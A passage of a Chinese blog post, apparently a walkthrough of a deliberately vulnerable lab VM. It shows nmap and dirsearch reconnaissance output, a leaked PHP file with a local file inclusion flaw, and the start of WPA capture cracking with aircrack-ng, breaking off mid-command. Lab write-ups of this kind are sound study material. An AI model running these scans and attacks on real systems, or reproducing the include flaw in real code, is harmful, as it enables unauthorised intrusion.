@@ -1,0 +1,751 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="VICTIM_1 靶机信息收集123456789101112131415┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;VICTIM_1]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.120Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-27 07:48 EDTNmap scan repor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VICTIM_1 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/10ac18445f7e.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="VICTIM_1 靶机信息收集123456789101112131415┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;VICTIM_1]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.120Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-27 07:48 EDTNmap scan repor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5e189dc8f8913672fce1b39269dc14ce_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/fa28f5e1da8a2365d72fdb4e121aeffd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/66a3d6137cda03eedcdf3e44af67799b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5f37d4e23d6fae957172b7f1ab464a65_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a4e2a176a6d8a7e6ca2682e4957b2105_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3f99cc0f1be7e5f210af50a7c58ae727_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/014cf963e6238d7a9a9dc7549f4ccb62_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e510b781a7c8a0beda69849426f75f46_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a4b064862ddf1bc95b1ad66fb11ad872_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/338a98313194eab353fafe5e007d7fd1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/kali-linux-2022.1-vmware-amd64-2023-06-29-22-14-27.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/1d097e3d83a5b88047258051bf60a815_MD5.png">
+<meta property="article:published_time" content="2023-06-27T12:39:14.000Z">
+<meta property="article:modified_time" content="2023-06-29T14:28:37.334Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/5e189dc8f8913672fce1b39269dc14ce_MD5.png">
+  
+  
+  
+  <title>VICTIM_1 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="VICTIM_1 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-27 20:39" pubdate>
+          2023年6月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          113 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">VICTIM_1 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="VICTIM-1-靶机"><a href="#VICTIM-1-靶机" class="headerlink" title="VICTIM_1 靶机"></a>VICTIM_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.120<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 07:48 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.120<br>Host is up (0.00036s latency).<br>Not shown: 65530 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy<br>8999/tcp open  bctp<br>9000/tcp open  cslistener<br>MAC Address: 08:00:27:CE:FC:4B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.42 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了22,80,8080,8999,9000 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,8080,8999,9000 192.168.56.120    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 07:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.120<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ea:e8:15:7d:8a:74:bc:45:09:76:34:13:2c:d8:1e:62 (RSA)<br>|   256 51:75:37:23:b6:0f:7d:ed:61:a0:61:18:21:89:35:5d (ECDSA)<br>|_  256 7d:36:08:ba:91:ef:24:9f:7b:24:f6:64:c7:53:2c:b0 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: 403 Forbidden<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>8080/tcp open  http    BusyBox httpd 1.13<br>|_http-title: 404 Not Found<br>8999/tcp open  http    WebFS httpd 1.21<br>|_http-server-header: webfs/1.21<br>|_http-title: 0.0.0.0:8999/<br>9000/tcp open  http    PHP cli server 5.5 or later (PHP 7.2.30-1)<br>|_http-title: Uncaught Exception: MissingDatabaseExtensionException<br>MAC Address: 08:00:27:CE:FC:4B (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|storage-misc<br>Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (93%), Synology DiskStation Manager 5.X (87%)<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2<br>Aggressive OS guesses: Linux 4.15 - 5.8 (93%), Linux 5.0 - 5.4 (93%), Linux 5.0 - 5.5 (90%), Linux 2.6.32 (87%), Linux 3.10 - 4.11 (87%), Linux 3.2 - 4.9 (87%), Linux 3.4 - 3.10 (87%), Synology DiskStation Manager 5.2-5644 (87%), Linux 2.6.32 - 3.10 (86%), Linux 2.6.32 - 3.13 (86%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.68 seconds<br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu 操作系统，80 端口 403 没有权限，8080 端口 404 没找到资源，8999 WebFS，9000 PHP cli server</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo nmap --script=vuln -p22,80,8080,8999,9000 192.168.56.120            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 08:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.120<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>8999/tcp open  bctp<br>9000/tcp open  cslistener<br>MAC Address: 08:00:27:CE:FC:4B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 94.78 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>漏洞脚本扫描没什么结果。依次查看各个端口的界面</p>
+<h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>80 端口提示<code>No configuration file found and no installation code available. Exiting...</code></p>
+<p><img src="/pic/5e189dc8f8913672fce1b39269dc14ce_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8080 端口提示 404</p>
+<p><img src="/pic/fa28f5e1da8a2365d72fdb4e121aeffd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8999 端口列出来一些文件，看起来是 wordpress，但是没有 wp-config.php</p>
+<p><img src="/pic/66a3d6137cda03eedcdf3e44af67799b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>9000 端口提示数据库连接缺少driver</p>
+<p><img src="/pic/5f37d4e23d6fae957172b7f1ab464a65_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时候没什么线索，我先把 8999 端口中的文件夹和文件大致浏览了一遍，没有发现可利用的地方，不过有个 <code>WPA-01.cap</code> 文件，下载后打开是个流量包</p>
+<p><img src="/pic/a4e2a176a6d8a7e6ca2682e4957b2105_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>不知道怎么处理，没看到敏感信息，那接下来进行目录爆破吧，看看是否能得到一些敏感文件或目录</p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>先从 80 端口开始爆破，大部分都是 403，所以不再一一列出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo dirsearch -u http://192.168.56.120                      <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.120/_23-06-27_08-04-12.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-27_08-04-12.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.120/<br><br>[08:04:16] 200 -   18KB - /LICENSE.txt <br>[08:04:16] 200 -    5KB - /README.txt<br>[08:04:21] 301 -  324B  - /administrator  -&gt;  http://192.168.56.120/administrator/<br>[08:04:21] 200 -   31B  - /administrator/cache/<br>[08:04:21] 200 -   74B  - /administrator/index.php<br>[08:04:21] 200 -   31B  - /administrator/logs/<br>[08:04:23] 200 -   31B  - /bin/<br>[08:04:23] 200 -   31B  - /cache/<br>[08:04:24] 200 -   31B  - /cli/<br>[08:04:24] 200 -   31B  - /components/<br>[08:04:28] 200 -    0B  - /file.php<br>[08:04:29] 200 -    3KB - /htaccess.txt<br>[08:04:29] 200 -   31B  - /images/ <br>[08:04:30] 200 -   31B  - /includes/<br>[08:04:30] 200 -   74B  - /index.php <br>[08:04:30] 200 -   74B  - /index.php/login/<br>[08:04:31] 200 -   31B  - /layouts/<br>[08:04:31] 200 -   31B  - /libraries/<br>[08:04:33] 200 -   31B  - /media/<br>[08:04:33] 200 -   31B  - /modules/<br>[08:04:36] 200 -   31B  - /plugins/<br>[08:04:38] 200 -   33B  - /robots.txt<br>[08:04:38] 200 -  829B  - /robots.txt.dist<br>[08:04:41] 301 -  320B  - /templates  -&gt;  http://192.168.56.120/templates/ <br>[08:04:41] 200 -   31B  - /templates/index.html                            <br>[08:04:41] 200 -   31B  - /templates/<br>[08:04:41] 200 -    0B  - /templates/beez3/<br>[08:04:41] 200 -    0B  - /templates/system/                               <br>[08:04:41] 200 -    0B  - /templates/protostar/<br>[08:04:42] 200 -   31B  - /tmp/ <br></code></pre></td></tr></table></figure>
+
+<p>size 为 31B 的都是回显为空的，为 0B 的是无回显的，<code>htaccess.txt</code> 和 <code>README.txt</code> 表明这原本是个 joomla-cms，<code>robots.txt</code> 里是被嘲讽的信息 <code>Disallow: h@ck3rz!</code>，尝试了一下确实不是目录，<code>robots.txt.dist</code> 是 joomla 的默认 disallow 目录。80 端口到现在为止没什么收获。扫描下 8080 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo dirsearch -u http://192.168.56.120:8080<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.120-8080/_23-06-27_08-17-47.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-27_08-17-47.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.120:8080/<br><br>[08:17:47] Starting: <br>[08:17:48] 200 -    0B  - /.bash_history                                   <br>[08:17:48] 200 -  220B  - /.bash_logout                                    <br>[08:17:48] 200 -    4KB - /.bashrc                                         <br>[08:17:49] 302 -    0B  - /.local  -&gt;  /.local/                            <br>[08:17:49] 200 -  807B  - /.profile                                        <br>[08:17:50] 200 -   66B  - /.selected_editor                                <br>[08:17:50] 200 -  765B  - /.viminfo                                         <br>[08:18:01] 403 -   93B  - /cgi-bin/                                         <br>[08:18:05] 200 -   63B  - /file.php                                         <br>[08:18:07] 403 -   93B  - /httpd.conf                                       <br>[08:18:12] 200 -   23B  - /passwords.txt                                   <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>这次感觉比较有东西，但是打开后发现 viminfo 文件中只有对网络操作的记录 <code>/etc/sysconfig/network</code>，file.php 进入直接下载下来了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;directory/&#x27;</span> . <span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>感觉可能存在文件包含。passwords.txt 里又是被嘲讽的句子</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">Hahahaha</span></span>...Try Harder!<br></code></pre></td></tr></table></figure>
+
+<p>到这里 8080 端口已有的信息已经处理完了，看看 9000 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/VICTIM_1]<br>└─$ sudo dirsearch -u http://192.168.56.120:9000/<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.120-9000/-_23-06-27_08-32-26.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-27_08-32-26.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.120:9000/<br><br>[08:32:26] Starting:<br>[08:33:39] 200 -    4B  - /files/<br>[08:33:39] 200 -    4B  - /files<br>[08:33:39] 200 -    4B  - /files/tmp/<br>[08:33:39] 200 -    4B  - /files/cache/ <br>[08:33:47] 200 -    0B  - /index.php<br>[08:35:25] 200 -  195B  - /files/.htaccess                                 <br>[08:35:25] 200 -  195B  - /files/.htaccess/<br></code></pre></td></tr></table></figure>
+
+<p>files 目录只有简单的一句 <code>no</code>，<code>.htaccess</code> 文件里也没什么东西</p>
+<p><img src="/pic/3f99cc0f1be7e5f210af50a7c58ae727_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>感觉现在比较可以作为突破点的是 file.php 文件内容中展现出的文件包含漏洞，尝试在各个端口构造文件包含漏洞的利用</p>
+<p><img src="/pic/014cf963e6238d7a9a9dc7549f4ccb62_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是 403 ……快山穷水尽了</p>
+<h2 id="aircrack-ng-爆破"><a href="#aircrack-ng-爆破" class="headerlink" title="aircrack-ng 爆破"></a>aircrack-ng 爆破</h2><p>不过还有个文件 <code>WPA-1.cap</code> 刚才一直不知道怎么处理，搜一搜吧，刚开始尝试搜 <code>cap penetration</code>，没什么有价值的信息，后续加上了文件名中的 <code>wpa</code> 搜索结果如下</p>
+<p><img src="/pic/e510b781a7c8a0beda69849426f75f46_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一个链接点进去。我们只想对 cap 文件进行处理，页面搜索 <code>.cap</code></p>
+<p><img src="/pic/a4b064862ddf1bc95b1ad66fb11ad872_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-b &lt;bssid&gt; : <span class="hljs-type">target</span> selection: <span class="hljs-keyword">access</span> point<span class="hljs-symbol">&#x27;s</span> MAC<br></code></pre></td></tr></table></figure>
+
+<p>-b 参数是用来指定接入点的 MAC，这里我们先尝试不添加这个参数直接开始运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 